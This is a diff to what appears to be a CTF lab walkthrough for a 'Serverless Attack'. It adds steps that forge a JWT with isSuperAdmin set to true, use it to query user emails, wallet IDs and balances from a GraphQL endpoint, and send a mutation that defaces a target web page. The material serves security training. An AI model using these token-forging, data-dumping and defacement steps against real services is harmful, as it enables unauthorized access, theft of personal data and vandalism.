@@ -1,7 +1,13 @@
 # **Serverless Attack**
 
 
-### *  *
+### *The goal of the attack is to:*
+
+* #### Gain access to a Serverless function
+* #### Steal meta-data from the said function
+* #### Use the stolen data to compromise AWS service(s)
+* #### Gain access to AWS service(s), steal necessary information
+* #### Deface a [website](https://serverless-defaceme.netlify.com/) that using the info
 
 -------
 
@@ -119,15 +125,103 @@ openssl rsa -in privkey -pubout -outform PEM -out public.key.pub
 
 * The `Payload` data can now be tampered with
 
+-------
+
+#### Step 8:
+
+* On a separate tab, access the `DefaceMe` web application.
+
+```commandline
+https://serverless-defaceme.netlify.com/
+```
+
+* On the browser, select the `Networks` tab that can be found in `developer tools`.
+
+* It can be observed that there's a **`POST`** method being called when the web application is loaded.
+
+* Copy and access the `URL` that the `POST` method is used on
+
+```commandline
+https://ctf-gql.we45.dev/graph
+```
+
+### *The website is using `GraphQL`*
+
+-------
+
+#### Step 9:
+
+* Paste the `GraphQL` URL on a `REST Client` on your machine.
+
+```commandline
+https://ctf-gql.we45.dev/graph
+```
+
+### *We'll be using [Insomnia](https://insomnia.rest/)*
+
+* On the `Rest Client`(Insomnia), select the method as **`POST`** and structure as **`GraphQL`**
+
+* `Refresh` the schema and try to perform a `query` leveraging the `Auto Completion` provided by GraphQL.
+
+### *It can be observed that a user has to be authorized to make changes on GraphQL*
+
+-------
+
+#### Step 10:
+
+* On the [`jwt.io`](https://jwt.io) tab, tamper the value of **`isSuperAdmin`** to `true` and copy the `JWT Token`.
+
+```commandline
+isSuperAdmin:true
+```
+
+-------
+
+#### Step 11:
+
+* Under the `Header` tab on the `REST Client`(Insomnia), add `authorization` and paste the value of the `JWT Token`
+
+* Perform a query to confirm if the token is working.
+
+**EXAMPLE**:
+
+```commandline
+query{
+  users {
+    id
+    email
+    firstName
+    lastName
+    walletId
+    openingBalance
+  }
+}
+```
+
+-------
+
+#### Step 12:
+
+* Update the mutation to deface the web application
+
+```commandline
+mutation{
+  createPage(body:"Changed", header:"Defaced", image:"<your favourite gif here>.gif")
+  {
+    newPage{
+      header
+      body
+      image
+    }
+  }
+}
+```
+
+* Access the [`DefaceMe`](https://serverless-defaceme.netlify.com/
+) web application to see if the attack was successful.
+
 --------
 
 ### Reading Material/References:
 
-* https://github.com/anchore/anchore
-
-* https://github.com/anchore/anchore-engine
-
-* https://anchore.com/opensource/
-
-* https://sysdig.com/blog/container-security-docker-image-scanning/
 
